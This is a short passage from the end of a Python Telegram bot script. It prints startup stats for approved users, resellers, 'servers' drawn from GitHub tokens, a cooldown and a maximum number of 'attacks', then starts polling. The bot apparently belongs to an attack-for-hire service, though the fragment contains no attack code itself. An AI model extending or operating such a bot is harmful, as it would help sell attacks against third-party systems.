    print(f"📊 ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀs: {len(approved_users)}")
    print(f"💰 ʀᴇsᴇʟʟᴇʀs: {len(resellers)}")
    print(f"🔑 sᴇʀᴠᴇʀs: {len(github_tokens)}")
    print(f"🔧 ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ: {'ᴏɴ' if MAINTENANCE_MODE else 'ᴏғғ'}")
    print(f"⏳ ᴄᴏᴏʟᴅᴏᴡɴ: {COOLDOWN_DURATION}s")
    print(f"🎯 ᴍᴀx ᴀᴛᴛᴀᴄᴋs: {MAX_ATTACKS}")
    print("━━━━━━━━━━━━━━━━━━━━━━")
    
    application.run_polling()

if __name__ == '__main__':

    main()
